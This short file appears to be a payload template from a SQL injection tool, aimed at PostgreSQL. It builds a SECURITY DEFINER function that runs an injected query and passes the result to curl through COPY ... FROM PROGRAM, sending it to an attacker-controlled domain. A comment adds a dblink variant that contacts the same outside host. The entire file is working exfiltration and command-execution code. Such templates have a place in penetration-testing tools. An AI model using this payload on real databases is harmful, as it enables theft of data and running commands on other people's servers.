DROP TABLE IF EXISTS %RANDSTR1%;
CREATE TABLE %RANDSTR1%(%RANDSTR2% text);
CREATE OR REPLACE FUNCTION %RANDSTR3%()
RETURNS VOID AS $$
DECLARE %RANDSTR4% TEXT;
DECLARE %RANDSTR5% TEXT;
BEGIN
SELECT INTO %RANDSTR5% (%QUERY%);
%RANDSTR4% := E'COPY %RANDSTR1%(%RANDSTR2%) FROM PROGRAM E\'curl -s http://%DOMAIN%/%PREFIX%.'||%RANDSTR5%||E'.%SUFFIX%\'';
EXECUTE %RANDSTR4%;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT %RANDSTR3%();
# Note: Requires COPY ... FROM PROGRAM privileges (superuser or pg_execute_server_program role)
# Alternative: SELECT * FROM dblink('host=%DOMAIN% port=80','SELECT 1') AS t(a text)
